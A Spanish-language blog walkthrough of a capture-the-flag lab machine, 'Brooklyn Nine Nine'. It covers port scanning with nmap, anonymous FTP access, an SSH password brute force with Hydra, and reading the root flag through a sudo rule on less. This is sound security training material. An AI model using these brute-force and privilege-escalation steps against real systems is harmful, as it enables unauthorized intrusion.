---
layout: post
author: Temerio
---

```bash
sudo nmap -p- -sSC --min-rate 5000 --open -vvv -n -Pn 10.10.241.206
```
```bash
Discovered open port 22/tcp on 10.10.241.206
Discovered open port 21/tcp on 10.10.241.206
Discovered open port 80/tcp on 10.10.241.206
```
___
Una vez descubierto que puertos abiertos tiene la maquina victima, hacemos un escaneo en profundidad.
```bash
sudo nmap -p21,22,80 -sCV -n -Pn 10.10.241.206 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-18 14:35 EST
Nmap scan report for 10.10.241.206
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.225.45
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.19 seconds
```
___

Podemos ingresar al FPT(Port-21) en modo Anonimo asi que procedemos a ingresar y listar su contenido.
```bash
┌──(temerio㉿Hackademy)-[~/Desktop/Thm/Brooklyn-nine-nine]
└─$ ftp 10.10.241.206
Connected to 10.10.241.206.
220 (vsFTPd 3.0.3)
Name (10.10.241.206:temerio): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
```
___

Dentro del File Transfer Protocol (FTP) se encuentra una nota para Jake, nos la descargamos a nuestra PC para posteriormente visualizar su contenido.
```bash
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.01 secs (19.4854 kB/s)
ftp> exit
221 Goodbye.
┌──(temerio㉿Hackademy)-[~/Desktop/Thm/Brooklyn-nine-nine]
└─$ cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
___

Visualizamos una nota con dos posibles usuarios `Amy y Jake`. Ya que amy le pide a Jake que cambie su contrase;a ya que es muy debil procederemos a Crackear su pass con el uso de Hydra.
```bash
┌──(temerio㉿Hackademy)-[~/Desktop/Thm/Brooklyn-nine-nine]
└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.241.206 

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-18 15:18:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.241.206:22/
[22][ssh] host: 10.10.241.206   login: jake   password: [Deleted]
1 of 1 target successfully completed, 1 valid password found
```
___

Una vez obtenida la contraseña nos conectamos mediante secureshell(SSH).
```bash
┌──(temerio㉿Hackademy)-[~/Desktop/Thm/Brooklyn-nine-nine]
└─$ ssh jake@10.10.241.206                        
jake@10.10.241.206's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ 
```
___

Listamos los comandos de sudo con `sudo -l`.
```bash
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
___

Observamos que `/usr/bin/less` (el cual es un enlace simbolico) puede ser ejecutado por cualquier usuario, podremos usarlo para obtener la flag de root.
```bash
jake@brookly_nine_nine:/$ cd /home/holt/
jake@brookly_nine_nine:/home/holt$ cat user.txt 
[Deleted By Temerio]
```
___

Ahora con less solo leemos la flag de root.

```bash
jake@brookly_nine_nine:/$ sudo /usr/bin/less /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: [Deleted]

Enjoy!!
/root/root.txt (END)
```
Room Completada.